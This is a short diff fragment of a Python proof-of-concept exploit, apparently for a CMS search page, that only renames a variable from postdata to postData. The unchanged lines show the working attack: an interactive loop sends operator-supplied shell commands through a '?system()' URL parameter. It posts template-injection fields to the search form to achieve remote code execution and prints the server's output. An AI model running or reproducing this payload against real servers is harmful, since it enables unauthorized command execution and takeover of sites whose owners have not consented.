@@ -13,7 +13,7 @@ def poc():
 				command = raw_input("[*] input the command:")
 				if command != "exit":
 					url = target.url + "?system(%s)" % command
-					postdata = {
+					postData = {
 						"searchtype":"5",
 						"searchword":"{if{searchpage:year}",
 						"year":":as{searchpage:area}}",
@@ -24,7 +24,7 @@ def poc():
 						"ver":"[QUERY_STRING]));/*"
 					}
 
-					r = requests.post(url,data=postdata)
+					r = requests.post(url,data=postData)
 					print(r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding))
 				else:
 					break
